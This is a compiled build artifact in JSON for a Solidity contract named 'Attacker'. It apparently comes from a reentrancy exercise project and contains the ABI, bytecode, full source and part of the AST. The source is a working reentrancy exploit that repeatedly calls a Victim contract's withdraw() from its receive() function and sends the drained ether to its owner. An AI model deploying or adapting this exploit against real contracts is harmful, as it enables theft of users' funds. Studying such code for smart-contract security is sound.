{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "poorvictim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawstolenmoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.19+commit.7dd6d404\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"poorvictim\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"victim\",\"outputs\":[{\"internalType\":\"contract Victim\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawstolenmoney\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":100},\"remappings\":[],\"viaIR\":true},\"sources\":{\"project:/contracts/Attacker.sol\":{\"keccak256\":\"0x10afcddeee77ad2b4dcc68b485d7506dee0f90626ccac8c74648dd7d6ed153ed\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4ebc18d1e820d9265e5a7bbc6c62b354b6d45b5c5e01a85e776376f3f488db9c\",\"dweb:/ipfs/QmNWcbrJDGjg13uBAHUB9nWDuvXpAe6sUXBGEhnM2GB4sh\"]},\"project:/contracts/Victim.sol\":{\"keccak256\":\"0x731f93f862b480cf6c824b1a71b8c0cb8545d757b69f1162560afcc299f0cba2\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://cc71cb6412bb5b7835e1bd46fb0653eafe74537fe84deeb62512abe248d1799a\",\"dweb:/ipfs/QmWZEE6oHDUrhbvJrk9hHjDwEVmjbC2ZwWwqzXviufRS6U\"]}},\"version\":1}",
  "bytecode": "0x60803461007a57601f61035138819003918201601f19168301916001600160401b0383118484101761007f5780849260209460405283398101031261007a57516001600160a01b0381169081900361007a5760018060a01b03193381600154161760015560005416176000556040516102bb90816100968239f35b600080fd5b634e487b7160e01b600052604160045260246000fdfe6080604081815260049182361015610084575b50361561001e57600080fd5b60009160018060a01b0383541690670de0b6b3a76400008231101561003f57005b8184923b15610080578291845180968193633ccfd60b60e01b83525af191821561007657505061006b57005b6100749061025b565b005b51903d90823e3d90fd5b8280fd5b600090813560e01c908163930c20031461023757508063979fd9f2146101b957639e5faafc036100125782816003193601126101b557670de0b6b3a7640000928334106101765782546001600160a01b03908116803b1561017257849084845180988193630d0e30db60e41b83525af1801561016857610154575b83809550541691823b1561014f578151633ccfd60b60e01b81529284918491829084905af190811561014657506101335750f35b61013c9061025b565b6101435780f35b80fd5b513d84823e3d90fd5b505050fd5b9290936101609061025b565b9183906100ff565b82513d86823e3d90fd5b8480fd5b906020606492519162461bcd60e51b8352820152601960248201527814d95b99081b59481cdbdb5948115512081d1bc81cdd185c9d603a1b6044820152fd5b5080fd5b5091346100805782600319360112610080576001546001600160a01b031690338290036102035750828080809347908282156101fa575bf115610076575080f35b506108fc6101f0565b606490602084519162461bcd60e51b8352820152600e60248201526d4e6f7420796f7572206d6f6e657960901b6044820152fd5b9050346101b557816003193601126101b55790546001600160a01b03168152602090f35b67ffffffffffffffff811161026f57604052565b634e487b7160e01b600052604160045260246000fdfea2646970667358221220bd6ec59a98f1da9e867146f5e33038f2df245dfd50c1370a5a7a0f1aa257e63064736f6c63430008130033",
  "deployedBytecode": "0x6080604081815260049182361015610084575b50361561001e57600080fd5b60009160018060a01b0383541690670de0b6b3a76400008231101561003f57005b8184923b15610080578291845180968193633ccfd60b60e01b83525af191821561007657505061006b57005b6100749061025b565b005b51903d90823e3d90fd5b8280fd5b600090813560e01c908163930c20031461023757508063979fd9f2146101b957639e5faafc036100125782816003193601126101b557670de0b6b3a7640000928334106101765782546001600160a01b03908116803b1561017257849084845180988193630d0e30db60e41b83525af1801561016857610154575b83809550541691823b1561014f578151633ccfd60b60e01b81529284918491829084905af190811561014657506101335750f35b61013c9061025b565b6101435780f35b80fd5b513d84823e3d90fd5b505050fd5b9290936101609061025b565b9183906100ff565b82513d86823e3d90fd5b8480fd5b906020606492519162461bcd60e51b8352820152601960248201527814d95b99081b59481cdbdb5948115512081d1bc81cdd185c9d603a1b6044820152fd5b5080fd5b5091346100805782600319360112610080576001546001600160a01b031690338290036102035750828080809347908282156101fa575bf115610076575080f35b506108fc6101f0565b606490602084519162461bcd60e51b8352820152600e60248201526d4e6f7420796f7572206d6f6e657960901b6044820152fd5b9050346101b557816003193601126101b55790546001600160a01b03168152602090f35b67ffffffffffffffff811161026f57604052565b634e487b7160e01b600052604160045260246000fdfea2646970667358221220bd6ec59a98f1da9e867146f5e33038f2df245dfd50c1370a5a7a0f1aa257e63064736f6c63430008130033",
  "immutableReferences": {},
  "generatedSources": [],
  "deployedGeneratedSources": [],
  "sourceMap": "79:655:0:-:0;;;;;;;;;;;;;-1:-1:-1;;79:655:0;;;;-1:-1:-1;;;;;79:655:0;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;79:655:0;;;;;;;;;;;;;;207:10;79:655;;;;;;;-1:-1:-1;79:655:0;;;-1:-1:-1;79:655:0;;;;;;;;;;;-1:-1:-1;79:655:0;;;;;;-1:-1:-1;79:655:0;;;;;-1:-1:-1;79:655:0",
  "deployedSourceMap": "79:655:0:-:0;;;;;;;;;;;;;-1:-1:-1;79:655:0;;;;;;;;;496:6;79:655;;;;;;;;;488:23;513:7;488:23;;:32;;485:78;;79:655;485:78;535:17;;;;;;;79:655;;;;;;;;;;;535:17;;;;;;;;;;;;;485:78;535:17;;;;:::i;:::-;;;79:655;;;;;;;;;535:17;79:655;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;329:7;318:9;;;:18;79:655;;;;-1:-1:-1;;;;;79:655:0;;;375:32;;;;;79:655;;;;;;;;;;;;375:32;;;;;;;;;;79:655;;;;;;;418:17;;;;;;79:655;;-1:-1:-1;;;418:17:0;;79:655;;;;;;;;;418:17;;;;;;;;;;79:655;;418:17;;;;:::i;:::-;79:655;;418:17;79:655;;;;418:17;79:655;;;;;;;;418:17;79:655;;;;375:32;;;;;;;:::i;:::-;;;;;;;79:655;;;;;;;;;375:32;79:655;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;79:655:0;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;79:655:0;;631:10;:19;;;79:655;;703:21;;;;;;;679:46;;;;;;79:655;679:46;;;;79:655;;;679:46;;;;;79:655;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;79:655:0;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;79:655:0;;;;;;;;;;;;;;:::o;:::-;;;;;;;;;;;",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.19;\nimport \"./Victim.sol\";\ncontract Attacker {\n\n    Victim public victim;\n    address private owner;\n\n    constructor(address poorvictim){\n        owner = msg.sender;\n        victim = Victim(poorvictim);\n    }\n\n    function attack() public payable {\n        require(msg.value>=1 ether,\"Send me some ETH to start\");\n        victim.deposit{value: 1 ether}();\n\n        victim.withdraw();\n\n    }\n\n    receive() external payable{\n        if(address(victim).balance>=1 ether){\n            victim.withdraw();\n        }\n    }\n\n    function withdrawstolenmoney() public {\n        require(msg.sender == owner ,\"Not your money\");\n        payable(owner).transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/home/aca/smartcontracts/reentrancy/contracts/Attacker.sol",
  "ast": {
    "absolutePath": "project:/contracts/Attacker.sol",
    "exportedSymbols": {
      "Attacker": [
        91
      ],
      "Victim": [
        157
      ]
    },
    "id": 92,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "0.8",
          ".19"
        ],
        "nodeType": "PragmaDirective",
        "src": "32:23:0"
      },
      {
        "absolutePath": "project:/contracts/Victim.sol",
        "file": "./Victim.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 92,
        "sourceUnit": 158,
        "src": "56:22:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Attacker",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 91,
        "linearizedBaseContracts": [
          91
        ],
        "name": "Attacker",
        "nameLocation": "88:8:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "930c2003",
            "id": 5,
            "mutability": "mutable",
            "name": "victim",
            "nameLocation": "118:6:0",
            "nodeType": "VariableDeclaration",
            "scope": 91,
            "src": "104:20:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Victim_$157",
              "typeString": "contract Victim"
            },
            "typeName": {
              "id": 4,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 3,
                "name": "Victim",
                "nameLocations": [
                  "104:6:0"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 157,
                "src": "104:6:0"
              },
              "referencedDeclaration": 157,
              "src": "104:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Victim_$157",
                "typeString": "contract Victim"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 7,
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "146:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 91,
            "src": "130:21:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 6,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "130:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "private"
          },
          {
            "body": {
              "id": 23,
              "nodeType": "Block",
              "src": "189:72:0",
              "statements": [
                {
                  "expression": {
                    "id": 15,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 12,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 7,
                      "src": "199:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 13,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "207:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 14,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "211:6:0",
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "207:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "199:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 16,
                  "nodeType": "ExpressionStatement",
                  "src": "199:18:0"
                },
                {
                  "expression": {
                    "id": 21,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 17,
                      "name": "victim",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 5,
                      "src": "227:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Victim_$157",
                        "typeString": "contract Victim"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 19,
                          "name": "poorvictim",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 9,
                          "src": "243:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 18,
                        "name": "Victim",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 157,
                        "src": "236:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Victim_$157_$",
                          "typeString": "type(contract Victim)"
                        }
                      },
                      "id": 20,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "236:18:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Victim_$157",
                        "typeString": "contract Victim"
                      }
                    },
                    "src": "227:27:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Victim_$157",
                      "typeString": "contract Victim"
                    }
                  },
                  "id": 22,
                  "nodeType": "ExpressionStatement",
                  "src": "227:27:0"
                }
              ]
            },
            "id": 24,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 9,
                  "mutability": "mutable",
                  "name": "poorvictim",
                  "nameLocation": "178:10:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 24,
                  "src": "170:18:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 8,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "170:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "169:20:0"
            },
            "returnParameters": {
              "id": 11,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "189:0:0"
            },
            "scope": 91,
            "src": "158:103:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 47,
              "nodeType": "Block",
              "src": "300:143:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 31,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 28,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "318:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 29,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "322:5:0",
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "318:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">=",
                        "rightExpression": {
                          "hexValue": "31",
                          "id": 30,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "329:7:0",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        },
                        "src": "318:18:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "53656e64206d6520736f6d652045544820746f207374617274",
                        "id": 32,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "337:27:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02",
                          "typeString": "literal_string \"Send me some ETH to start\""
                        },
                        "value": "Send me some ETH to start"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02",
                          "typeString": "literal_string \"Send me some ETH to start\""
                        }
                      ],
                      "id": 27,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "310:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 33,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "310:55:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 34,
                  "nodeType": "ExpressionStatement",
                  "src": "310:55:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 35,
                          "name": "victim",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 5,
                          "src": "375:6:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Victim_$157",
                            "typeString": "contract Victim"
                          }
                        },
                        "id": 37,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "382:7:0",
                        "memberName": "deposit",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 109,
                        "src": "375:14:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 39,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "hexValue": "31",
                          "id": 38,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "397:7:0",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        }
                      ],
                      "src": "375:30:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 40,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "375:32:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 41,
                  "nodeType": "ExpressionStatement",
                  "src": "375:32:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 42,
                        "name": "victim",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 5,
                        "src": "418:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Victim_$157",
                          "typeString": "contract Victim"
                        }
                      },
                      "id": 44,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "425:8:0",
                      "memberName": "withdraw",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 144,
                      "src": "418:15:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 45,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "418:17:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 46,
                  "nodeType": "ExpressionStatement",
                  "src": "418:17:0"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 48,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "276:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 25,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "282:2:0"
            },
            "returnParameters": {
              "id": 26,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "300:0:0"
            },
            "scope": 91,
            "src": "267:176:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 65,
              "nodeType": "Block",
              "src": "475:94:0",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 57,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 53,
                            "name": "victim",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 5,
                            "src": "496:6:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Victim_$157",
                              "typeString": "contract Victim"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Victim_$157",
                              "typeString": "contract Victim"
                            }
                          ],
                          "id": 52,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "488:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 51,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "488:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 54,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "488:15:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 55,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "504:7:0",
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "488:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": ">=",
                    "rightExpression": {
                      "hexValue": "31",
                      "id": 56,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "513:7:0",
                      "subdenomination": "ether",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
                        "typeString": "int_const 1000000000000000000"
                      },
                      "value": "1"
                    },
                    "src": "488:32:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 64,
                  "nodeType": "IfStatement",
                  "src": "485:78:0",
                  "trueBody": {
                    "id": 63,
                    "nodeType": "Block",
                    "src": "521:42:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "id": 58,
                              "name": "victim",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 5,
                              "src": "535:6:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Victim_$157",
                                "typeString": "contract Victim"
                              }
                            },
                            "id": 60,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "542:8:0",
                            "memberName": "withdraw",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 144,
                            "src": "535:15:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                              "typeString": "function () external"
                            }
                          },
                          "id": 61,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "535:17:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 62,
                        "nodeType": "ExpressionStatement",
                        "src": "535:17:0"
                      }
                    ]
                  }
                }
              ]
            },
            "id": 66,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 49,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "456:2:0"
            },
            "returnParameters": {
              "id": 50,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "475:0:0"
            },
            "scope": 91,
            "src": "449:120:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 89,
              "nodeType": "Block",
              "src": "613:119:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 73,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 70,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "631:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 71,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "635:6:0",
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "631:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 72,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 7,
                          "src": "645:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "631:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4e6f7420796f7572206d6f6e6579",
                        "id": 74,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "652:16:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924",
                          "typeString": "literal_string \"Not your money\""
                        },
                        "value": "Not your money"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924",
                          "typeString": "literal_string \"Not your money\""
                        }
                      ],
                      "id": 69,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "623:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 75,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "623:46:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 76,
                  "nodeType": "ExpressionStatement",
